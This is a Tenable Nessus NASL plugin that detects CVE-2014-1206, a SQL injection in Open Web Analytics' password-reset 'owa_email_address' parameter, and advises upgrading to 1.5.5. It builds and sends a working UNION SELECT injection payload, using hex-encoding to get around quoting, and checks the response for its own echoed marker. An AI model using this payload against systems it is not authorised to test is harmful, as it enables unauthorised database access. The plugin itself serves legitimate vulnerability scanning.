#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(74188);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/20 14:21:43 $");

  script_cve_id("CVE-2014-1206");
  script_bugtraq_id(64774);
  script_osvdb_id(101925);
  script_xref(name:"EDB-ID", value:"31738");

  script_name(english:"Open Web Analytics owa_email_address SQL Injection");
  script_summary(english:"Tries to return the script name in the HTTP GET response.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is vulnerable to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The version of Open Web Analytics hosted on the remote web server
fails to sanitize input to the 'owa_email_address' parameter of the
'index.php' script before using it in a database query.

An unauthenticated remote attacker can leverage this issue to
manipulate database queries, resulting in the disclosure or
manipulation of arbitrary data.");
  script_set_attribute(attribute:"see_also", value:"http://www.secureworks.com/advisories/SWRX-2014-001/SWRX-2014-001.pdf");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2014/Feb/66");
  script_set_attribute(attribute:"see_also", value:"http://wiki.openwebanalytics.com/index.php?title=1.5.5");
  script_set_attribute(attribute:"solution", value:"Upgrade to Open Web Analytics 1.5.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Open Web Analytics Password Reset Page owa_email_address Parameter SQL Injection");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/11/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/11/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/05/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:openwebanalytics:open_web_analytics");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("open_web_analytics_detect.nbin");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/openwebanalytics");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'openwebanalytics', port:port, exit_on_fail:TRUE);
dir = install['dir'];
install_url = build_url(port:port, qs:dir+"/");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

# Try to exploit the issue to generate a SQL error.
magic = hexify(str:SCRIPT_NAME);

# replace special characters so they work in the request
magic = str_replace(find:"(", replace:"%28", string:magic);
magic = str_replace(find:",", replace:"%2C", string:magic);
magic = str_replace(find:")", replace:"%29", string:magic);

exploit = '-NESSUS%27+UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C' + magic +
  '%2C7%2C8%2C9%2C10%23';
url = dir + '/index.php?owa_submit=Request+New+Password&owa_action=base.passwordResetRequest&' +
  'owa_email_address=' + exploit;

res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

if ('Invalid address: '+SCRIPT_NAME >< res[2])
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    header =
      'Nessus was able to verify the issue by manipulating the email for\n' +
      'a non-existent user\'s email using the following URL';
    report = get_vuln_report(items:url, port:port, header:header);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, 'Open Web Analytics', dir);
